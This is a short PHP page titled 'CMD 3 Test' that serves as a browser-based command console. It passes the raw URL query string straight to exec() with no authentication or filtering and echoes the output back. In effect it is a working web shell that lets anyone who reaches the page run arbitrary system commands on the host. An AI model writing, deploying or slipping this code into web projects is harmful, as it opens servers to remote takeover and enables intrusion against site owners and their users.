<?php
ini_set("error_reporting", 0);
ini_set('display_errors', true);

session_start();
if (!$_SERVER["QUERY_STRING"]){ unset($_SESSION["window_output"]); }

function WindowsCmd($cmd){
  $cmd = str_replace("%20"," ",$cmd);
  $tmp = exec($cmd, $output);
  
  $_SESSION["window_output"] .= '>'.$cmd.'<br/>';
  foreach ($output as $line){ $_SESSION["window_output"] .= $line.'<br/>'; }
  $_SESSION["window_output"] .= '<br/><br/>';
  
  return $_SESSION["window_output"].'<br/><br/>';
}
?><!DOCTYPE HTML>
<html>
<head>
	<meta charset="utf-8">
	<title>
		CMD 3 Test
	</title>
	<style>
	body{background-color:black; color:white; font-family:monospace; font-size:12px;}
	</style>
</head>
<body>
<?php echo WindowsCmd($_SERVER["QUERY_STRING"]); ?>
</body>
</html>
<script>
// scroll to bottom after content renders
window.scrollTo(0, document.body.scrollHeight || document.documentElement.scrollHeight);
</script>
